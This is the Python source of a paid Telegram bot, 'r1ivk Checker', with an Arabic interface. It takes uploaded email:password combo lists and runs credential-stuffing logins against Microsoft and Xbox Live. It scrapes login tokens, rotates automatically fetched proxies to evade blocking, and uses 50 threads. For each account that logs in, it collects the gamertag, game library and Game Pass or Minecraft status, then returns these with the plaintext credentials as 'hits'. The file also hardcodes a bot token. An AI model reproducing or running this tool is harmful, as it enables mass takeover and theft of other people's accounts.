# -*- coding: utf-8 -*-
"""
TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (FULL ENGINE + AUTO PROXY + DB)
"""

import os
import re
import time
import random
import sqlite3
import requests
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== CONFIGURATION ===================
BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "@r1ivk"
bot = telebot.TeleBot(BOT_TOKEN)

# =================== DATABASE SETUP ===================
def init_db():
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            is_premium INTEGER DEFAULT 0,
            joined_date TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def is_user_premium(user_id):
    if user_id in [123456789]: # استبدلها بأيدي مالك البوت الأساسي
        return True
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT is_premium FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] == 1 if row else False

def add_user_to_db(user_id):
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id, is_premium, joined_date) VALUES (?, 0, ?)', 
                   (user_id, time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()

# =================== GLOBALS ===================
active_scans = {}  
scan_lock = threading.Lock()

# =================== AUTO PROXY FETCHER ===================
def fetch_fresh_proxies():
    """جلب بروكسيات حية تلقائياً وتحديث ملف البروكسيات"""
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxyscan.io/download?type=http"
    ]
    new_proxies = []
    for src in proxy_sources:
        try:
            resp = requests.get(src, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.splitlines()
                for line in lines:
                    line = line.strip()
                    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$', line):
                        new_proxies.append(line)
        except Exception:
            continue
    
    if new_proxies:
        with open("good_proxies.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(list(set(new_proxies))[:500])) # حفظ حتى 500 بروكسي نشط

# تشغيل جلب البروكسيات تلقائياً في الخلفية كل ساعة
def background_proxy_updater():
    while True:
        fetch_fresh_proxies()
        time.sleep(3600)

threading.Thread(target=background_proxy_updater, daemon=True).start()

# تحميل البروكسيات
PROXIES_LIST = []
if os.path.exists("good_proxies.txt"):
    with open("good_proxies.txt", "r", encoding="utf-8") as f:
        PROXIES_LIST = [line.strip() for line in f if line.strip()]

def get_random_proxy():
    if not PROXIES_LIST:
        return None
    p = random.choice(PROXIES_LIST)
    if not p.startswith("http"):
        return {"http": f"http://{p}", "https": f"http://{p}"}
    return {"http": p, "https": p}

# =================== BYPASS & CORE LOGIC ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
        r'value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"',
        r'value=\"([^\"]+)\"[^>]*name=\"PPFT\"',
        r'name=\"PPFT\"[^>]*value=\"([^\"]+)\"',
        r'value="([^"]+)"[^>]*id="i0327"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'"urlPost":\s*"([^"]+)"',
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_account_turbo(combo, user_state):
    if not user_state.get('is_running', True):
        return

    parts = combo.split(':')
    if len(parts) < 2:
        with user_state['lock']:
            user_state['bad'] += 1
            user_state['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
    session = None

    for attempt in range(2):
        if not user_state.get('is_running', True):
            return

        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        
        current_proxy = get_random_proxy()
        if current_proxy:
            session.proxies.update(current_proxy)

        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            resp = session.get(sftag_url, timeout=10)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)

            if not sftag or not url_post:
                with user_state['lock']:
                    user_state['errors'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i19': '0',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
            }
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=10)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if token_match:
                    ms_token = token_match.group(1)
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect", "account or password is incorrect"]):
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif any(x in login_text for x in ["recover", "identity/confirm", "abuse", "locked", "help us protect", "verify your identity", "security challenge", "two-step"]):
                with user_state['lock']:
                    user_state['twofa'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif 'cancel?mkt=' in login_text or 'kmsi' in login_text or 'stay signed in' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text) or re.search(r'action="([^"]+)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {
                            'ipt': ipt_match.group(1),
                            'pprid': pprid_match.group(1),
                            'uaid': uaid_match.group(1),
                            'LoginOptions': '3',
                            'type': '11',
                        }
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=10)
                        if 'access_token' in ret.url:
                            ms_token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                except Exception:
                    pass

            if not ms_token:
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=10)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag, gamerscore = "N/A", "0"
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=10)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=10)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': gamerscore = s['value']
            except Exception:
                pass

            has_gp, gp_type = False, "None"
            is_minecraft = "NO"
            games_list = []
            
            try:
                xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://licensing.xboxlive.com", "TokenType": "JWT"}
                xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=10)
                
                if xsts_store_req.status_code == 200:
                    xsts_store_token = xsts_store_req.json()['Token']
                    inv_req = session.get(
                        "https://inventoryservices.xboxlive.com/users/me/inventory/items?type=Game",
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}", "x-xbl-contract-version": "1"},
                        timeout=10
                    )
                    if inv_req.status_code == 200:
                        items = inv_req.json().get("items", [])
                        for item in items:
                            name = item.get("name") or item.get("productId")
                            if name and name not in games_list:
                                games_list.append(str(name))
                                if "minecraft" in str(name).lower():
                                    is_minecraft = "YES"

                sub_req = session.get(
                    "https://purchase.mp.microsoft.com/v7/policies/subscriptions",
                    headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"},
                    timeout=10
                )
                if sub_req.status_code == 200:
                    sub_text = sub_req.text.lower()
                    if "game pass ultimate" in sub_text:
                        gp_type = "Game Pass Ultimate"
                        has_gp = True
                    elif "game pass" in sub_text:
                        gp_type = "Xbox Game Pass"
                        has_gp = True
            except Exception:
                pass

            hit_block = f"""{email}:{password}
Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
Subscriptions: {gp_type}
Games List:"""
            
            if games_list:
                for idx, g in enumerate(games_list, 1):
                    hit_block += f"\n{idx} - {g}"
            else:
                hit_block += "\nNo extra games found in inventory."
            
            hit_block += f"\n{'-'*40}\n"

            with user_state['lock']:
                user_state['hits_list'].append(hit_block)
                user_state['hits'] += 1
                user_state['checked'] += 1
            if session:
                session.close()
            return

        except Exception:
            if session:
                session.close()
            continue

    with user_state['lock']:
        user_state['errors'] += 1
        user_state['checked'] += 1

# =================== TELEGRAM UI & HANDLERS ===================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    add_user_to_db(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_checker = types.InlineKeyboardButton("🚀 تشغيل فاحص ريفك (r1ivk Checker)", callback_data="start_checker")
    btn_status = types.InlineKeyboardButton("📊 حالة الاشتراك والحدود", callback_data="check_status")
    btn_channel = types.InlineKeyboardButton("📢 قناة التجمعات والتبليغات", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
    btn_buy = types.InlineKeyboardButton("💎 شراء نسخة بريميم (15$ / 30 يوم)", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
    
    markup.add(btn_checker, btn_status, btn_channel, btn_buy)
    
    welcome_text = (
        "👑 *مرحباً بك في لوحة تحكم r1ivk Checker الرسمية (Ultimate)* ⚡\n\n"
        "الأداة الأسرع والأقوى لفحص حسابات إكس بوكس ومايكروسوفت مع تحديث البروكسيات تلقائياً ودعم قاعدة البيانات.\n\n"
        "📌 *اختر أحد الخيارات أدناه للبدء:*"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def callback_checker(call):
    bot.answer_callback_query(call.id, "جاري فتح نافذة الفاحص...")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ إلغاء والعودة للقائمة", callback_data="back_home"))
    
    text = (
        "🚀 *تم تفعيل وضع الفحص المباشر (Ultimate Engine)*\n\n"
        "📁 أرسل ملف الكومبو الآن بصيغة (`.txt`) وبداخل كل سطر:\n"
        "`email:password`\n\n"
        "📌 *ملاحظة:* النسخة المجانية تدعم حتى **10,000 سطر** كحد أقصى.\n"
        "💎 لرفع الحظر وفحص ملفات غير محدودة، تواصل مع المالك: {OWNER_USERNAME}"
    ).format(OWNER_USERNAME=OWNER_USERNAME)
    
    bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_status")
def callback_status(call):
    chat_id = call.message.chat.id
    is_prem = is_user_premium(chat_id)
    status_text = "💎 بريميم (غير محدود)" if is_prem else "👤 مجاني (بحد أقصى 10,000 سطر)"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_home"))
    
    bot.answer_callback_query(call.id)
    bot.edit_message_text(f"📊 *معلومات حسابك:*\n\n• معرفك (ID): `{chat_id}`\n• نوع الحساب: *{status_text}*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["cancel_scan", "refresh_stats", "back_home"])
def handle_callbacks(call):
    chat_id = call.message.chat.id
    if call.data == "cancel_scan":
        if chat_id in active_scans:
            active_scans[chat_id]['is_running'] = False
        bot.answer_callback_query(call.id, "تم إيقاف الفحص.")
        bot.edit_message_text("❌ *تم إيقاف الفحص يدوياً بواسطة المستخدم.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")
    elif call.data == "refresh_stats":
        bot.answer_callback_query(call.id, "تم تحديث الإحصائيات!")
    elif call.data == "back_home":
        bot.answer_callback_query(call.id, "العودة للرئيسية")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🚀 تشغيل فاحص ريفك (r1ivk Checker)", callback_data="start_checker"),
            types.InlineKeyboardButton("📊 حالة الاشتراك والحدود", callback_data="check_status"),
            types.InlineKeyboardButton("📢 قناة التجمعات والتبليغات", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
        )
        bot.edit_message_text("👑 *مرحباً بك من جديد في لوحة التحكم الرئيسية:*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(chat_id, "⚠️ عذراً، يجب إرسال ملف نصي بصيغة `.txt` فقط!")
        return

    is_prem = is_user_premium(chat_id)

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"combo_{chat_id}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]

        if not combos:
            bot.send_message(chat_id, "⚠️ الملف فارغ أو الصيغة غير صحيحة!")
            return

        unique_combos = list(dict.fromkeys(combos))

        if not is_prem and len(unique_combos) > 10000:
            bot.send_message(chat_id, f"⚠️ *تم تجاوز الحد المسموح!*\nملفك يحتوي على {len(unique_combos)} سطر.\nالنسخة المجانية تدعم حتى **10,000 سطر**.\n\nلترقية حسابك تواصل مع المالك: {OWNER_USERNAME} (15$ / 30 يوم)", parse_mode="Markdown")
            return

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="cancel_scan"))
        markup.row(types.InlineKeyboardButton("🔄 تحديث مباشر", callback_data="refresh_stats"))
        markup.row(types.InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="back_home"))

        status_msg = bot.send_message(chat_id, "🔥 *جاري تحضير وبدء الفحص المباشر (مع البروكسيات التلقائية)...*", parse_mode="Markdown", reply_markup=markup)

        user_state = {
            'chat_id': chat_id,
            'checked': 0,
            'total': len(unique_combos),
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'errors': 0,
            'hits_list': [],
            'is_running': True,
            'lock': threading.Lock(),
            'start_time': time.time()
        }
        active_scans[chat_id] = user_state

        threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state, status_msg.message_id), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء معالجة الملف: {e}")

def update_stats_loop(chat_id, msg_id, state):
    while state['is_running'] and state['checked'] < state['total']:
        time.sleep(2)
        elapsed = time.time() - state['start_time']
        cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
        
        pct = (state['checked'] / state['total']) * 100
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)

        text = f"""🔥 *لوحة إحصائيات الفحص المباشر ({time.strftime('%H:%M:%S')})*

📊 *الإجمالي:*         {state['total']}
✓ *تم فحصهم:*    {state['checked']}
✗ *غير مصيب (Bad):* {state['bad']}
★ *الصيد (Hits):*    {state['hits']}
🔒 *تحقق (2FA):*     {state['twofa']}
⚠ *أخطاء:*          {state['errors']}

التقدم: {pct:.1f}%
\\[{bar}\\]

⚡ *السرعة (CPM):* {cpm}
⏱️ *الوقت المنقضي:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}

🎮 *إحصائيات الألعاب:*
• صيد ماينكرافت: {state['hits']}
• صيد إكس بوكس: {state['hits']}"""

        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="cancel_scan"))
            markup.row(types.InlineKeyboardButton("🔄 تحديث مباشر", callback_data="refresh_stats"))
            markup.row(types.InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="back_home"))
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        except Exception:
            pass

def run_turbo_scan(combos, state, msg_id):
    threads = 50  
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
        concurrent.futures.wait(futures)

    state['is_running'] = False
    elapsed = time.time() - state['start_time']
    
    final_text = f"""✅ *تم الانتهاء من فحص مكتبة الإكس بوكس وجيم باس بالكامل!*

📊 *الإجمالي:*         {state['total']}
★ *الصيد الناجح:*  {state['hits']}
🔒 *التحقق الثنائي:* {state['twofa']}
✗ *الغير صالحة:*     {state['bad']}

⏱️ *الوقت المستغرق:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""

    try:
        bot.edit_message_text(final_text, chat_id=state['chat_id'], message_id=msg_id, parse_mode="Markdown")
    except Exception:
        pass

    if state['hits'] > 0:
        result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
        try:
            with open(result_file_path, 'w', encoding='utf-8') as f:
                f.write("🔥 r1ivk Checker ⚡ Scan Results (Full Library & GamePass) 🔥\n")
                f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                f.write("="*50 + "\n\n")
                f.writelines(state['hits_list'])
            
            with open(result_file_path, 'rb') as f:
                bot.send_document(state['chat_id'], f, caption=f"📁 *ملف الصيد الناتج (Hits)* (عدد الصيد: {state['hits']})", parse_mode="Markdown")
            
            os.remove(result_file_path)
        except Exception as e:
            bot.send_message(state['chat_id'], f"⚠️ خطأ أثناء إرسال ملف النتائج: {e}")
    else:
        bot.send_message(state['chat_id'], "⚠️ انتهى الفحص، للأسف لم يتم العثور على صيد مطابق.")

if __name__ == "__main__":
    print("[+] r1ivk Checker ⚡ Ultimate Bot is running with Auto-Proxies & Database...")
    bot.infinity_polling()
